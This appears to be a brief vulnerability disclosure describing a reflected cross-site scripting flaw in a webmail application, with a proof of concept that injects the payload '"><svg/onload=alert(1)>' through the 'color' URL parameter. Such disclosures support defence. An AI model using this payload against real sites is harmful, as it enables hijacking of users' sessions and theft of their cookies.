The end admins or useras browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. Even an attacker can easily place users in social engineering through this vulnerability and create a fake field.
# PoC:

[+] Add the "color" parameter to the URL and write malicious code, Example: http://localhost/webmail/?color="><svg/onload=alert(1)>
[+] When the user goes to the URL, the malicious code is executed
Example Vulnerable URL: http://localhost/webmail/?color="><svg/onload=alert(1)> (Payload: "><svg/onload=alert(1)>)
